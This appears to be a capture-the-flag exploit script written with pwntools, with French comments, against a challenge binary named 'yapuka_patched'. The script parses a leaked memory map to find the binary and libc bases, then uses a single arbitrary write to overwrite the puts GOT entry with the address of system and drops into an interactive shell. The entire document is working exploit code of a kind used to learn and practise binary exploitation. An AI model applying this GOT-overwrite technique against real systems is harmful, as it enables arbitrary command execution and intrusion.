from pwn import *

elf = ELF("./yapuka_patched")
libc = ELF("./libc-2.36.so")

if args.REMOTE:
    io = remote("localhost", 4000)
else:
    io = process("./yapuka_patched")

maps = io.recvuntil(b"Now you can write once at an choose location!").decode()

base_bin = int(re.search(r"(\w+).*/yapuka", maps).group(1), 16)
libc_base = int(re.search(r"(\w+).*/libc", maps).group(1), 16)

puts_got = base_bin + elf.got["puts"] #puts_got = 0x4000 readelf -r ./yapuka_patched | grep puts
system = libc_base + libc.sym["system"] #systemlibc = 0x4c490 readelf -s libc-2.36.so | grep system


io.sendline(str(puts_got).encode()) #str car c comme si on taper au clavier et encode pour que sendline envoie bien
io.sendline(str(system).encode()) #str car c comme si on taper au clavier et encode pour que sendline envoie bien

io.interactive()
